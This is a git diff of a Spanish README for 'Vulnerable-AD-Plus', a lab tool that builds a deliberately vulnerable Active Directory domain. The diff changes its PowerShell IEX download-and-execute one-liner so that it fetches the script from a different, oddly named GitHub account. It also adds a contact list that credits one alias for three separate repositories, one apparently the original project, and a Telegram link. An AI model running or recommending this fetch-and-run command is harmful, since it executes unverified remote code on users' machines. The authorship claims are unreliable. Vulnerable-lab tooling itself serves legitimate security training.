@@ -1,4 +1,4 @@
-# Vuln ad plus :octocat:
+﻿# Vuln ad plus :octocat:
 Vulnerable-AD-Plus
 
 ## :information_source: Descripción
@@ -86,5 +86,14 @@ if you already installed Active Directory, just run the script !
 
 # Ejecutar script:
 ```powershell
-IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/kvlx-alt/vulnerable-AD-plus/master/vulnadplus.ps1")); Invoke-VulnAD -UsersLimit 20 -DomainName "vuln.internal "
+IEX((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/vulnerable-AD-plus/refs/heads/master/vulnadplus.ps1")); Invoke-VulnAD -UsersLimit 20 -DomainName "vuln.internal "
 ```
+
+:warning: Disclaimer: Este script es solo para uso educativo y personal. No lo utilices para acceder a redes de terceros sin autorización, ya que esto es ilegal y contrario a los términos de uso de este proyecto.
+
+## :email: Contacto 
+* :busts_in_silhouette: **Dzhoni_dev**: [GitHub](https://github.com/safebuffer/vulnerable-AD) - Desarrollador Vuln ad plus
+* :busts_in_silhouette: **Dzhoni_dev**: [GitHub](https://github.com/WaterExecution/vulnerable-AD-plus) - Actualización de versión
+* :busts_in_silhouette: **Dzhoni_dev**: [GitHub](https://github.com/AAAAAEXQOSyIpN2JZ0ehUQ/Wifite-Utility) - Contribución Readme
+
+☆ https://t.me/AAAAAEXQOSyIpN2JZ0ehUQ [  ⃘⃤꙰✰ ] ☆
